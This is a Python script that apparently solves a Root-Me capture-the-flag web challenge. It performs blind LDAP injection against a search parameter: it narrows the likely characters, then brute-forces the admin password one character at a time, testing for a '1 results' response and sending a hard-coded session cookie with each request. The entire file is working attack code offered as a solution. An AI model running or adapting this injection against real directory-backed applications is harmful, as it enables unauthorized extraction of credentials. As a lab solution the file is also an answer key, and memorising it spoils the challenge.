import requests

page = 'http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search='
cookies = {'spip_session': '612488_53de6f4f4fa73447681d06c3f8627d13'}
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
red_chars = ''
password = ''
for char in chars:  # Character Reduction
    request = page + 'admin*)(password=*' + char
    result = requests.get(request, cookies=cookies)
    if '1 results' in result.text:
        red_chars += char
while True:  # Brute-forcing the password
    for char in red_chars:
        request = page + 'admin*)(password=' + password + char
        result = requests.get(request, cookies=cookies)
        if '1 results' in result.text:
            password += char
            break
    else:
        print(f'The password is {password}')
        break
